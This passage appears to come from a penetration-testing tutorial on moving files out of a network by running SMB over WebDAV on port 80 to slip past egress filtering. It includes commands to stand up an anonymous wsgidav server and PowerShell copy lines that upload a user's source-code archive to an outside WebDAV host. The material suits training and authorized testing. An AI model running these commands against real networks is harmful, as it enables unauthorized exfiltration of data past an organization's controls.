-----
We previously discussed that companies usually allow outbound traffic using `HTTP` (TCP/80) and `HTTPS` (TCP/443) protocols. Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. 

An alternative is to run SMB over HTTP with `WebDav`. `WebDAV` is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The `WebDAV` protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. `WebDAV` can also use HTTPS.

When you use `SMB`, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP. 

- Configure the WebDav server

```bash
sudo pip3 install wsgidav cheroot
```

- Using the WebDav Python Module
```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

- Connecting to the Webdav share
```powershell
dir \\<webdav-ip>\DavWWWRoot
```

**Note:** `DavWWWRoot` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.

You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder

- Uploading files using SMB
```powershell
copy C:\Users\John\Desktop\Sourecode.zip \\<webdav-ip>\DavWWWRoot\
copy C:\Users\John\Desktop\Sourecode.zip \\<webdav-ip>\sharefolder\
```

